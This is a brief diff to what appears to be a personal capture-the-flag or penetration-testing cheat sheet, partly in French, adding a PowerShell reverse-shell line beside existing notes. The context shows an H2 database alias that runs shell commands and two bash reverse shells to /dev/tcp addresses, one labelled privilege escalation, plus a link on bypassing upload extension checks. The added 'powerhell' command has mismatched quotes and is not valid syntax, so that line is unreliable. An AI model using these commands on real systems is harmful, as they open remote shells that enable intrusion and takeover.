@@ -27,6 +27,8 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
 CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 ```
 
+- Reverse shell powerhell --> `powershell -r 10.10.9.11:1234'
+
 - [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
 
 - `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges
